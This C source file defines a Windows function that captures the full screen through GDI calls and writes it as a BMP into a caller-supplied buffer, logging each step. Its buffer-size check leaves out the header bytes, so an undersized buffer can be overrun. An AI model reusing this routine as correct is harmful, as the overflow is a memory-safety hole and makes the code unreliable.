#include "BaseScreenshot.h"

BOOL baseScreenshot(char* buffer, size_t bufferSize, size_t* outSize)
{
    LogMsg("[SCREENSHOT] Taking screenshot...");

    // Initialize variables
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    if (!hMemoryDC)
    {
        ReleaseDC(NULL, hScreenDC);
        return FALSE;
    }

    LogMsg("[SCREENSHOT] Created compatible DC");

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (!hBitmap)
    {
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return FALSE;
    }

    LogMsg("[SCREENSHOT] Created compatible bitmap");

    SelectObject(hMemoryDC, hBitmap);

    // Capture the screen
    if (!BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY))
    {
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return FALSE;
    }

    LogMsg("[SCREENSHOT] Captured screen");

    // Prepare BITMAPINFOHEADER
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = height;
    bi.biPlanes = 1;
    bi.biBitCount = 24; // 24-bit bitmap
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    // Calculate the size of the bitmap data
    size_t bmpDataSize = ((width * bi.biBitCount + 31) / 32) * 4 * height;

    // Initialize buffer pointer
    char* bmpData = buffer;

    if (bmpDataSize > bufferSize)
    {
        // Buffer too small
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return FALSE;
    }

    LogMsg("[SCREENSHOT] Calculated bitmap data size");

    // Copy BITMAPFILEHEADER
    bmfHeader.bfType = 0x4D42; // 'BM'
    bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpDataSize;
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    memcpy(bmpData, &bmfHeader, sizeof(BITMAPFILEHEADER));
    bmpData += sizeof(BITMAPFILEHEADER);

    // Copy BITMAPINFOHEADER
    memcpy(bmpData, &bi, sizeof(BITMAPINFOHEADER));
    bmpData += sizeof(BITMAPINFOHEADER);

    // Get the bitmap data
    if (!GetDIBits(hMemoryDC, hBitmap, 0, height, bmpData, (BITMAPINFO*)&bi, DIB_RGB_COLORS))
    {
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return FALSE;
    }

    LogMsg("[SCREENSHOT] Copied bitmap data");
    
    *outSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpDataSize;

    // Clean up
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    return TRUE;
}